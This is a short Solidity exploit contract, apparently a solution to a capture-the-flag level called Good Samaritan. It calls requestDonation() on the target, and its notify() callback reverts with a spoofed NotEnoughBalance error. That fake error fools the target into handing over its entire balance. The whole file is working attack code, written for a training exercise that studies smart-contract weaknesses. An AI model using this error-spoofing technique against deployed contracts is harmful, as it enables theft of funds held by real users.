// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./27_GoodSamaritan.sol";

contract GoodSamaritanAttack {
    GoodSamaritan goodSamaritan;
    error NotEnoughBalance();

    constructor(address _goodSamaritanAddr) {
        goodSamaritan = GoodSamaritan(_goodSamaritanAddr);
    }
    function attack() external {
      goodSamaritan.requestDonation();
    }
    function notify(uint256 amount) external {
      if (amount == 10) revert NotEnoughBalance();
    }
    
}
